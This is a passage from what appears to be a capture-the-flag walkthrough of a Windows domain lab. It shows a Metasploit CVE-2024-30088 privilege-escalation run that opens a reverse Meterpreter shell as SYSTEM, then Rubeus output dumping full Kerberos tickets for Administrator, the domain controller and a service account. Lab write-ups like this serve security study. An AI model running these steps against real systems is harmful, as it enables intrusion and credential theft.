   LHOST     10.10.14.136     yes       The listen address (an inter
                                        face may be specified)
   LPORT     4446             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.14.136
LHOST => 10.10.14.136
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 9001LPORT => 9001
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.14.136:9001
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 4396...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 1064
[+] Successfully retrieved winlogon pid: 592
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 3 opened (10.10.14.136:9001 -> 10.10.11.89:51066) at 2025-10-06 21:13:00 +0545

meterpreter > shell
Process 4680 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```bash
PS C:\Users> cd Administrator
cd Administrator
PS C:\Users\Administrator> cd Desktop
cd Desktop
PS C:\Users\Administrator\Desktop> cat user.txt
cat user.txt
61d31fb5bbd5fba0998f15969d786834
```
# Privilege Escalation

Transfer Rubeus.

```bash
PS C:\Users\svc_sql> ./Rubeus.exe monitor /interval:1 /nowrap
./Rubeus.exe monitor /interval:1 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 10/6/2025 10:38:02 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 12:19:14 PM
  EndTime               :  10/6/2025 10:19:14 PM
  RenewTill             :  10/13/2025 12:19:14 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/6/2025 10:38:02 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 12:17:46 PM
  EndTime               :  10/6/2025 10:16:44 PM
  RenewTill             :  10/13/2025 12:16:44 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4Gk+2Zu0faYyTzQEvsrJ5awNny3vjJVZwGr6CO+h1BFhiC94YlqJeSKu/TEg7CgfKC7vmyrbQfgFj7/pUV1uGSFpLklrLUNQfINkw01yEPmjRnHr0/PGe2aj/OkxqNyoLeLvtdZaF49hUSAqr0PsE4BbFB5rl9WngSMeXzV0NriFgfcaIAhOISpV8Gl+XzXe9mGOnh0K/379XGDJvVhhHmOUA4z0zxfFObMqLbnJxGqCnH3l02/Tcy1gIQ3CqoVwruj18S82feBBbkQROl57CByOTAViqFV4kEZlAQj+YWUMvsflSAgbdlXCtO4oHTTv0BSqIrPuPAEM5mA/hE2tmty8Ilw3dA0O72cv3Tgu6xxNFAUGAZ/x1StgWLiE1NAX0PfvLVM3JhXp31qBr2+cMVxMmqe0lHLlmFWkx75GtEC8uPnrDbecgR2RAmlUF1BAEgRg4mttHA35/LQgQxsnJIjr4Zn8Apj38lxrX392WnI+P4pemi7al/3RHGLiApl001QfgwWFLNeSw1epjyRMY6Xf8D6Ygc0c6VWuDBWfdAIMZjToIf4/Mpe6sNpNhk2V/rYWQnIspdH25UGsRzXVbs/2A4Vzj77fIakRDm11M7yj3J0PWGJmRUOv2XQQXPMSYjJwy0pwu6CleSinZoT1OgPeEaF0fu1tyhp/i32qif+f+rYpVnjMUDTA+b6bEv5RWzfXpIVA8h0C6ciH9pJXhAdRGzs9g8OMhacBCE3vcdJPzNYnfB8gWMz4hGgs1adcp0KAGA93KyBuEtK9nuWG2CfGiprgDZJvtiEbYg3HMi0xxHWIKtvve/N8w5k/fVtzqXd0HUo7uFv6VHRukQfN6cBFKPLqrXR/GnqcY8Vmz+F7Sqxkebqig9L6lz1eubYoLYRQQbo455hc5tH4sM1HcNlw8TtPPa6DNVeyux8KoiWqC7WFFSpPAHvkmMBFgk7iOFg67mWJk0ka9OTmKOBeN4CBtRMYmrsaiuI5OPnQojPbVT9VBVo6wTGMZt8c6Ozm8V8/vRCCD7v+62UQBaLbZLSaOYVq6F775ak3ckAO21JSjcwC4Iil6IlqQusOqKZDluFoEGHXpqxMIRakxyzOQ9SoRyLpdCVxtnX55Glftwm8p01RW3NZGASGMG/WAzSGg0IjNYJ5h/57Ytfky2AFG3rpNHFnbLhfThcwUX1o7WVkPba3LoKeQ+85UqpKYqSzsMh1aJH8IZT8O/WYVA7X71RzMA/tgBZElQLivHsg13lbgDngJhVC+BNM9+vArWdzJamtLTvQDSzDkI6D7X/52TfBH2+O3Ay7suHMZkq8Dx4LWu8TTQsTTrofBHDsiMCrSvkpJ/zSFP89BSlI/grLXv5BjWixI/zp26nWUgZUd/BBw+8YuO7O7p4C8WtaqDIA1a/m7rLEc/BOuf+yz89XUwa1GvE8gwFi76TTPE74ejgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDNA+N2zlpaOItgo6nSpcU7jgPbyhxrIZfyTXvkQgDj7KEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAYKEAAKURGA8yMDI1MTAwNjE5MTc0NlqmERgPMjAyNTEwMDcwNTE2NDRapxEYDzIwMjUxMDEzMTkxNjQ0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/6/2025 10:38:03 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 1:16:14 PM
  EndTime               :  10/6/2025 11:16:14 PM
  RenewTill             :  10/13/2025 1:16:14 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5WH/EUZ6ld2g246S7Ax/9nCh2MzNHqZydSJArZxCWDD1Ms0zS6b9U6XvGkXXr7kH7SKUJJUQ6F3KUKEO7xaZH0qvozVkNPpYFbS5/PW8qKLQC++i4YStPIDGGo373vfmDbxFJ819x+6wm1eQJJS5C0Z91QUA/eYHAsKV2sgE8TDOG0B2Do/cMzWIyc5VJ0Vv6UJQjctlFmeGn2IXx43eYolZJP6qODYvM/XN1MNUXECKB4mJrVw2lEF2NoaOccgLJmkZ0VfY9/GZyYSCqPi7LlFnOH+ciQMhuutEDjsLJEATsQpAg+eG3DT2PzO1aqCpINLUIs2YCRqqE3KWLpof9djrxUvQet7u6AzOH3JBBa+76QhiBOtbV/f6ETuHkAgc1BvsjJGze9PnQ2doSSJvhxf9WXbHvmHZdiLWrKZGz+MTONL0EDS2RgMsosB1Bg8/lwk4WM+BSyTZm7aeggYGpIb8/Cu8QSNuiumDdaWlPYqFuyGl57743IOYW+7f2945r4KALhuwlDIv95/E44yWbaFkGOHzJ3Umaf0125ugqe5ag0Qgf4vToZsjR/tsDMogPBZpyLozXwfERXHxsFla1HIEK8ktJdUjYnvTy1LHdFwN/uCvtvxyR2ISsv0VEYbmBqTg1EaOZIX9uzF/Sg40mGk3kuxmpX4fHVusQdHGQ/gOSAFOB0Ix8cX0Xl2ReofiADCxix8rqV6g6aKnsqaaUSMeVOsciwExQJuQz4UuBx9yWQMFXbiykdtgY3y0zzzP2ytHQ7AYRlyoxoHqZF3XQlPrNcR+lSHrWi0/tJx029nL0Kl56Ik19CxYQZINdLaKzslD/6+tDywdQPyeIjWk7y1KRVAWKK6wjziSIJXjZx6ZH8YKF3iai0kcz8lH4BaXjs7GoDMwES+U+zNzHOzhvWe9+yT5ly6fs1TfnYvNQLqjCXBXXFdbB4/k/xiKfhQFdwmNELsqHgqgEOvmDJUL0yRe+L7RMmggWVNqX6AxpnxxTsTc9MvajLmbMj9I2mEa4nuGaZO6xWf5fCFUQsrQT9OWakjv2TgUbS4o8AEi1wUEmUlyoIv+PAtJlCIZC5GRlxNHSEJLBYSS/+24PT+t1uNavqgBBtD31lPqOEXMQZRD2IBFv7rXuhxAzpvAsETIxvuzK8/fMEiIjUG2zq+avXNcePb8RFn5S9VkDh63A21wYQnKM4rTcu+oM5WFOawCvtrno/HnFbTCslzyJp+8fGcj5wLQrDKPKBFrxVB4rFBfwIUAkojQepnInyQj7wjDSC6im0R711nu+ZgDlzgcSxlemf/BmtbZJ1vvt3B5rWmuTavLBZf00dAeR5V7ZAlKEK+bcYe98dVkZohhoizaEPj/6jbSAY5EfppdmVDwxowuOQymk5K/FrcXlaL6eJ173pwYpGkrKO2vYxGKASeYNsoUCRmF1N73zs7qcR1b2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBY4xvlUC8IYVVgzrBxH95BjPwmKMhTjEqcLamZDAjiL6EOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDI1MTAwNjIwMTYxNFqmERgPMjAyNTEwMDcwNjE2MTRapxEYDzIwMjUxMDEzMjAxNjE0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/6/2025 10:38:03 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 3:35:20 PM
  EndTime               :  10/7/2025 1:35:20 AM
  RenewTill             :  10/13/2025 3:35:20 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIF7DCCBeigAwIBBaEDAgEWooIE7DCCBOhhggTkMIIE4KADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEpDCCBKCgAwIBEqEDAgECooIEkgSCBI7VCWyPTns6TC/umBcy08s7aywdQLbkyIZJwUC+X2y2kMrUwTGMUE4BHdJm4sy5jgM0NzMVsc7vKw0xdOamMarks3RVqXMcoslQIeyJ2zmqZZf+TTih6yIyx9n6bxRHgPcuJd+uSa90+7ipdMaDjhI0ZOpB/HPjahRPEc+nd17w4h5XZzuOvmnWKSio8LqWwWqax/y3weidlEDZinpR4+rAMg5RE/Mbve5ilvyTY3KlmZYn5u7g327I5NH66atuCc/XIWFc/XpJPXa25AWL1Sp6yJB+CgIbYDA2aC0dssHP/ckSSMpzzY6Fc1y9TgNXPppN09XBo73Nm0q7aE7plby+DafGX8dzRX+6nOBNlqyU3ovJdMA7qaFGhgMQIWSFCAyl6m9vvDEg+6p0XIJeKLQfEHgLNT4auy2ugH7Uq2IhXHWvgNODuYq3Qo6NoLE8AQGYhdQBVycc9syFKTg1Opa7I9hXI+RbkCbw/IEj7Go/aXnKDmFeo6Kxjbl9c9Xw3ztwVDSAKTP22WT0z/+H6P3iiH24GPs3Rxv0/O9BkW3lYAFX1B/DPfcddRvtsQ7FjdMmhfb+lLQiJataDwC/FwRFO5tSWE9tqCQS7z5j4pjs0PMarz8OrvU0dsIs3r+qIf9sq/dxrL6ILi0HgRn/4NyPTvoQXaRSAdN5sbcZBafV0aVU3mR5xHU+9ZONkSBOuiM2Bte6ldwqTmFJ9cAW3TWqsGrkeoInfaoRdFplvQDowYUn8WkGFykmiE24ImNYxwiSpgrxZ5w/7+6tMc0ShryRGPOfofntA3CGpdozvIziMviIYqSPQyZtn/u8LVt2kOGMJaLTrLEQH2o623OL4qkAYZ5WFlTGSL4jmBpw4s82OCM1Leo1cCJw1Ub2YyP5aJGZ908xDQqtqaXFn4E3nkLxvPAsYjz2ZIOfO1Mzy/C5oe4+RJhs2mi680j5iTBhdTs/OVHwMnFceuxre0+obzljp/gpta71E4F6xGnhAluE/GI4VKc3nNs+AeKWs+Xhe+KQheYmFgmRGNQxLAbKotSBayjeMSkqGMmTykgV5icVRkNX2xhC37SnduX5zk2YFiWVbMOLXprct4VyIeRwTGMB8fvUwxb+i/P/1YG/HmW1UUpKCDQikEiya6fbxnXVz0674PXZk1ZDLrVtgMCKnhUAzTYBCbjOk22eyrW4wWyqtmL7Mgtn/KG6QFwIggNt9lLm59+mUu/Q8WKUiNEOZGnAzMwiILjcS1UiJiBrijn5oMCG/Dq4apqQis9ke+NrgOEd9YHqIgfHMa2UO++UQhA7etsaVWjY3EQEnV0KfUQmrzW7CoTfSSwl6FiwRB5t/CoE6vT8RBrmI0erMtKbipWBHXdN3Neix3RWsPy8vu9HJhqUrszB8lELBIpvoK27UX5H15q53RuhzVScDZQstpvWI5EmF2K3ENr17B8ch5bZUq/LNlCLLJkJWNktpk/kIQ7IqR6VRSjzIxe4mgpQpOIN/p1xOrBUl9Cru3CNo8RU7WjroApqqhVuIqtsEj5cEXWhOx7BGb2/WswwMKid5aOB6zCB6KADAgEAooHgBIHdfYHaMIHXoIHUMIHRMIHOoCswKaADAgESoSIEIPMLBsoexHuj0ZVR4YSS9bRf2tk4N8yi0mi5pWjfEIXOoQ4bDERBUktaRVJPLkVYVKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyNTEwMDYyMjM1MjBaphEYDzIwMjUxMDA3MDgzNTIwWqcRGA8yMDI1MTAxMzIyMzUyMFqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=


[*] 10/6/2025 10:38:03 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 2:35:20 PM
  EndTime               :  10/7/2025 12:35:20 AM
  RenewTill             :  10/13/2025 2:35:20 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/6/2025 10:38:03 PM UTC - Found new TGT:

  User                  :  svc_sql@DARKZERO.EXT
  StartTime             :  10/6/2025 1:42:05 PM
  EndTime               :  10/6/2025 10:18:23 PM
  RenewTill             :  10/13/2025 12:18:23 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/6/2025 10:38:03 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 2:41:46 PM
  EndTime               :  10/6/2025 11:34:22 PM
  RenewTill             :  10/13/2025 1:34:22 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
  Base64EncodedTicket   :

    doIF/jCCBfqgAwIBBaEDAgEWooIFBjCCBQJhggT+MIIE+qADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IEvjCCBLqgAwIBEqEDAgEBooIErASCBKg/phm5sYjwSqfKWgxwVSpGr0NqdXGJcRKvmcLIzI6nfG9zQMm0AF4fdIrCgx4GGOdAfHAnPYQ8Q6CKBNGNsUmQoVrmsV7JhOrC1wF8Tp+DYxi8K35F2Jx3B2idpY/Iw5/8jxWCSpBx1yU2k+uSHFqmx8sAZudMCyZPdJ+1CiFK5G3M4+wXYXkx+rmP0cjl7GdT6IH2U+YvdtNgvgFsqYfvSjZ7vis4RFPK3o2lN0N24J50ttAq7cUUEfx3MZ6PdX9RP5RgXquJLCH39JraAYxYhlWShhmVIfUr12jgbL+JRBL5ljV+o/owN+eHMYo0/bSBg2S1oIut1I1lJfULCvRCufY9jkL65QuTtZKBGxyqWVjL3gFvh7MvwLXTOdWp7CpC709+OycVslC/tcORYNsGccFRFvChG2hrvOfDzzKxnURfZbptZ2DAlAPO7w2sqRX6KGZtw9eEn8wADPIUfH2VP96CxeLe/ZSxWv5VhcRHHegSzbZa1nYEZ21U+cGqlke1vOTNhLn9ITIMP0GxBXDRHY2gCz9NhIgGUxtpIkZgehDxTSZh8xkWusqqINMWWEK0lli5cSC5XmtdgbKWNdYaBq6cs1oo+gapSQu6Z6kF92YqvjTOshYlWCEi86rbRIX6SfEyu6/0GHwc1I14zZgLb+T99jkPuoLWptmdGZLvewalPrmpCEEw51kxwbDFMnBXMvh5pJim8FjJ670NDFKhoaubiKanlq1F51fvRdlKblXXn/ALrB89Z5ALEsEKGLruzMwqUsy3RZiBXs8tRj48O/D4mT+0xLWTahvYcHj/lFcwT+dX490C/+ikfpy0yNBYxxkWYQp6hcAibkW6HLVoO1Ce82IBO7jT4d9owUNGpMyv6tosni7ECixFMSvQJgMuEq/hvGnowW3UJG4mhYEDfYasRuYdm6hCDLueY835aEB4Y6gaxSiO1Q3ESpu+or3z0++EZWzWJ+m+wFg/Ifgepz6PAmckBZpteZGj1xxkaCwJQplhf/Ma88JfFSm8OnOjwbGWGteK/23pz5OMr8O/jjk9pk66Oq27J/N0K/lfEG//0ez17+kKaxRPl0Oy+SelOG7S5d/kDhX0oXhwNzuI/oMLcMwomU9m8mbcd0NIH3AFkvKwhdaIatZqPT2XJ9OYcNErR1TuYRl7MeTNGbRJEchyZvhAUJc1q9PsK2uuQ9XATq1ML0MFBmxkA5VB0zngJyPE/CWM804AehMAzXo6Uw2GiLWvIwxUFXw1GveCwhsBn93xVQ6UhHTW7BxqI4TmC3kqm674Lhe/qqCGf2Hup6hHJaWJ8sFp5I4yTLd7z97c1u6NJX5q5vl/WERhRYGYsyrVyAicuZ3jQhukpLWZRKvJr2/sidp+UEd9BJ51RyVFEwLqIYdPFG1shovT48BEMpw9wbstoeknQt5bs2MS1X